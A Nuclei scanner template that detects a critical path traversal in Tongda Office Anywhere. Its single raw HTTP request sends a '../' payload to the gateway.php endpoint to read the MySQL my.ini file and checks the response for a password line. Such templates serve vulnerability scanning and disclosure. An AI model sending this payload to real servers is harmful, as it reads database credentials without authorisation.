id: tongda-path-traversal

info:
  name: Office Anywhere TongDa - Path Traversal
  author: pikpikcu
  severity: critical
  description: |
    Office Anywhere (OA) is susceptible to path traversal vulnerabilities which can be leveraged to perform remote code execution.
  reference:
    - https://github.com/jas502n/OA-tongda-RCE
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  metadata:
    max-request: 1
  tags: tongda,lfi,vuln

http:
  - raw:
      - |
        POST /ispirit/interface/gateway.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        json={"url":"/general/../../mysql5/my.ini"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[mysql]"
          - "password="
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
